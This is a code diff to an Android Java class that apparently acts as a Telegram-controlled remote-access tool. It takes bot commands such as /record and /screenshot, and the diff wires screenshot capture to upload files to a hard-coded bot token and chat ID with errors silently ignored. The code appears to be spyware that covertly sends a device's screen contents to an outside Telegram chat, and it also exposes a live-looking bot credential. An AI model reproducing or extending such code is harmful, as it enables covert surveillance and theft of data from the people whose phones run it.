@@ -8,6 +8,9 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -15,7 +18,7 @@ import java.net.URL;
 public class TelegramPoller implements Runnable {
     private Context ctx;
 
-    // ⚠️ ضع التوكن و CHAT_ID الصحيحين ⚠️
+    // ⚠️ ضع التوكن و CHAT_ID الصحيحين هنا ⚠️
     private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";
     private static final String CHAT_ID = "7058836561";
 
@@ -73,9 +76,9 @@ public class TelegramPoller implements Runnable {
             } else if (cmd.equals("/record")) {
                 sendMessage("🎤 سيبدأ التسجيل (سيتم تفعيله قريباً)");
             } else if (cmd.equals("/screenshot")) {
-                sendMessage("🖥️ سيتم أخذ لقطة شاشة (سيتم تفعيلها قريباً)");
+                // سيتم تفعيل لقطة الشاشة عبر ScreenCaptureService
+                ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
             } else if (cmd.equals("/play")) {
-                // 🔥 فتح اللعبة الجديدة
                 Intent intent = new Intent(ctx, WordOrderActivity.class);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 ctx.startActivity(intent);
@@ -101,4 +104,66 @@ public class TelegramPoller implements Runnable {
             conn.disconnect();
         } catch (Exception ignored) {}
     }
-        }
+
+    // ============================================================
+    //  دوال ثابتة لاستخدامها من ScreenCaptureService وغيره
+    // ============================================================
+
+    public static void sendMessageStatic(String chatId, String text) {
+        try {
+            String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
+            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
+                    "/sendMessage?chat_id=" + chatId +
+                    "&text=" + encodedText;
+            URL url = new URL(urlString);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(5000);
+            conn.getResponseCode();
+            conn.disconnect();
+        } catch (Exception ignored) {}
+    }
+
+    public static void sendPhotoStatic(String chatId, File photoFile, String botToken) {
+        try {
+            String boundary = "*****" + System.currentTimeMillis() + "*****";
+            String lineEnd = "\r\n";
+            String twoHyphens = "--";
+
+            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setDoInput(true);
+            conn.setDoOutput(true);
+            conn.setUseCaches(false);
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Connection", "Keep-Alive");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
+
+            dos.writeBytes(twoHyphens + boundary + lineEnd);
+            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
+            dos.writeBytes(lineEnd);
+            dos.writeBytes(chatId + lineEnd);
+
+            dos.writeBytes(twoHyphens + boundary + lineEnd);
+            dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + photoFile.getName() + "\"" + lineEnd);
+            dos.writeBytes(lineEnd);
+
+            FileInputStream fileInputStream = new FileInputStream(photoFile);
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
+                dos.write(buffer, 0, bytesRead);
+            }
+            fileInputStream.close();
+            dos.writeBytes(lineEnd);
+            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+            dos.flush();
+            dos.close();
+            conn.getResponseCode();
+            conn.disconnect();
+        } catch (Exception ignored) {}
+    }
+                } 
